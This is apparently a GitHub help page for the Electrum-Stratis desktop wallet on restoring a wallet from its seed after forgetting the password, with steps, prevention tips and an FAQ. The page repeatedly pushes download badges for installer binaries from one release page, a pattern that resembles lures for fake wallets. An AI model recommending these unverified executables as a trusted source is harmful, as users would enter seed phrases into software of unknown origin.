![Electrum-Stratis](assets/banner-article.png)

# Forgot the wallet password but still have the seed

<p align="center">The seed opens a new file</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A forgotten password is not a loss if the seed is written down. Restore the wallet from the seed into a fresh wallet file, set a new password, and the old one becomes irrelevant - it is never needed for that route. The seed rebuilds the addresses, the history and the balance without touching the encrypted file at all. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Your situation | Route | What you need |
|---|---|---|
| Seed written down, password forgotten | Restore from seed | The phrase, and a known address to compare |
| Seed lost, password forgotten, file present | Offline candidate search | Candidates, and honest expectations |
| Seed and file both present | Restore from seed | Nothing else |
| Seed present, but the phrase looks wrong | Check the derivation before concluding | A known address |

</div>

The order of preference is fixed: seed first, file second, nothing third. Anything that offers a fourth route is selling something.

## Why it happens

The password encrypts the local wallet file. It is not an account credential and is not stored anywhere, which is why no reset exists and why support cannot help. The file carries ciphertext and a verifier: the verifier can confirm a correct guess and cannot produce the password from itself, only confirm or deny a guess. The seed sits above that file: it is the input from which the addresses were derived, so a restore produces a new file where the old password has no role.

That asymmetry is why the answer to "I forgot my password" is almost always "then use the seed". The file is a convenience layer; the seed is the wallet.

The maintained build puts both choices on the first screen, and its current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19): Create and Recover are equal options, so the restore path is the front door rather than a hidden menu.

## Fix

1. **Find the seed before touching the old file.** Do not delete or overwrite the existing wallet file; it costs nothing to keep and may hold imported keys the seed does not.
2. **Install or open the wallet and choose Recover.** Select the legacy seed restore rather than creating a new wallet.
3. **Type the phrase into the wallet window only.** Not into a website, a support chat, a form or a browser extension. No legitimate process asks for it anywhere else.
4. **Compare the address preview with a known address.** The preview appears before you commit; if the first address matches one you have received funds at, the seed and configuration are right.
5. **Set a new password and let it sync.** The restored wallet encrypts itself with the new password and rebuilds history from the chain; an empty balance before sync is expected.

After the restore, the old file can stay as an archive. If it contained imported keys, restore or sweep those separately, because they were never part of the seed - the [standard, multisig and imported wallets in Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) explain why an imported key sits outside the phrase. If the restored balance looks short, check [three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md) before assuming the phrase was wrong.

## If that did not work

If the preview shows different addresses, the phrase is from a different wallet or the restore is pointed at the wrong chain. Check the paper, not a photograph of it, and compare the address format with a known one.

If the restore works but the balance is lower than expected, the missing part is usually an imported key or an unconfirmed transaction rather than a seed problem.

If the seed is not available and the file is the only artifact left, the offline search is the only route: it tests candidates against the file and reports honestly when it cannot succeed. Keep the file even if the search fails; it is the only object that could ever open, and a forgotten password sometimes surfaces months later. Beware anyone offering to run that search for a fee - it is a local operation.

## Prevention

- Write the seed at creation, verify it once, and store it in two places.
- Use a passphrase you can retype rather than one you invent on the spot.
- Keep the wallet file as a copy, with its password recorded separately.
- Note which wallet each seed belongs to, and which chain.
- Re-test the restore once a year, before you need it.
- Write the seed on paper before setting a password, so the file is never the only object you hold.

## FAQ

### I forgot my Stratis Electrum wallet password and have the seed. How do I recover?

Choose Recover on first launch, select the legacy seed restore, enter the phrase in the wallet window, confirm the address preview against a known address, then set a new password. The old password is not required and the old file can stay untouched.

### I lost my Stratis wallet password - any suggestions?

Two routes only: restore from the seed, or test candidate passwords against the file you have. If neither is available, nothing recovers the wallet, and any service claiming otherwise is a scam. Start with whichever of the two objects you actually hold.

### Does restoring from the seed delete my old wallet file?

No. The restore writes a new file; the old one stays where it was. Keep it until the restored wallet is confirmed working, then archive or remove it deliberately.

### Will the restored wallet have a new password?

Yes. A restore creates a new encrypted file, and you choose its password during the restore. The forgotten password has no bearing on the new file.

<!-- DOWNLOAD-BLOCK -->

The seed does not decrypt the file, it replaces it. Restoring from the phrase creates a new wallet with the same keys and a new password of your choosing, and the old file becomes an artefact you can keep or discard. That is why a forgotten password with a seed is an inconvenience, and a forgotten password without one is the end of the balance.

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
